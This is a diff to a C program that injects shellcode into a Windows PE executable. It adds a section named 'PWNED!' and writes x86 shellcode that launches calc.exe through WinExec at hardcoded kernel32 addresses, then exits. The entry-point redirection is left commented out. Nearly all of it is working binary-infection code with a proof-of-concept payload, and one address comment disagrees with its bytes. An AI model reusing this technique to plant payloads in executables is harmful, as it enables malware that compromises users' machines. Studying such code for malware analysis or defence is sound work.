@@ -15,14 +15,30 @@ int main(int argc, char *argv[]) {
 		exit(EXIT_FAILURE);
 
 	/*
-	 * Fix Pattern
+	 * Pattern
 	 */
-	char pattern = 0x90;
+	char pattern = 0x00;
+
 	/*
 	 * Shellcode JMP EntrypointRedirection
 	 * E9 DWORD : Jump near, relative, displacement relative to next instruction
 	 */
-	char shellcode[] = "\xE9";
+	char shellcode[] =
+"\xEB\x16"             //JMP SHORT 0x16
+"\x5B"                 //POP EBX
+"\x31\xC0"             //XOR EAX,EAX
+"\x50"                 //PUSH EAX
+"\x53"                 //PUSH EBX
+"\xBB\xF1\x2F\x4D\x76" //MOV EBX, 0x75AD2FF1 ;kernel32.dll WinExec
+"\xFF\xD3"             //CALL EBX
+"\x31\xC0"             //XOR EAX,EAX
+"\x50"                 //PUSH EAX
+"\xBB\xD8\x79\x45\x76" //MOV EBX,75A579D8 ;kernel32.dll ExitProcess
+"\xFF\xD3"             //CALL EBX
+"\xE8\xE5\xFF\xFF\xFF" //CALL 0xE5FFFFFF
+"\x63\x61\x6C\x63\x2E\x65\x78\x65"; //ASCII "calc.exe", 0x00
+//"\xE9"; //Jump short EOP ~ need enable Write EOP
+
 	DWORD sizeofshellcode = strlen(shellcode) * sizeof(char);
 
 	/*
@@ -37,8 +53,8 @@ int main(int argc, char *argv[]) {
 	ReadFile(hFile, &hDOS, sizeof(IMAGE_DOS_HEADER), &dwTaille, NULL);
 	SetFilePointer(hFile, hDOS.e_lfanew, 0, FILE_BEGIN);
 	ReadFile(hFile, &hNT, sizeof(IMAGE_NT_HEADERS), &dwTaille, NULL);
-
-	for (int i = 0; i < hNT.FileHeader.NumberOfSections; i++)
+	int i;
+	for (i = 0; i < hNT.FileHeader.NumberOfSections; i++)
 		ReadFile(hFile, &hSection, sizeof(IMAGE_SECTION_HEADER), &dwTaille,
 		NULL);
 
@@ -49,7 +65,7 @@ int main(int argc, char *argv[]) {
 	/*
 	 * Craft own section
 	 */
-	memcpy(ownSection.Name, "FOOBAR", 8);
+	memcpy(ownSection.Name, "PWNED!", 8);
 	ownSection.Misc.VirtualSize = alignment(hNT.OptionalHeader.SectionAlignment,
 			sizeofshellcode);
 	ownSection.VirtualAddress = alignment(hNT.OptionalHeader.SectionAlignment,
@@ -86,15 +102,16 @@ int main(int argc, char *argv[]) {
 	 * Calculate and Write Original AddressOfEntryPoint
 	 * Original AddressOfEntryPoint is less than VirtualAddress of the own section
 	 * This is a relative jump
-	 */
+
 	DWORD EntryPointRedirection = hNT.OptionalHeader.AddressOfEntryPoint
-			- ownSection.VirtualAddress - sizeof(DWORD);
+			- ownSection.VirtualAddress - sizeofshellcode - sizeof(DWORD);
 	WriteFile(hFile, &EntryPointRedirection, sizeof(DWORD), &dwTaille, NULL);
+	*/
 
 	/*
 	 * Write pattern to fill empty
 	 */
-	for (unsigned int i = 0; i < ownSection.SizeOfRawData - sizeofshellcode;
+	for (i = 0; i < ownSection.SizeOfRawData - sizeofshellcode;
 			i++)
 		WriteFile(hFile, &pattern, sizeof(char), &dwTaille, NULL);
 
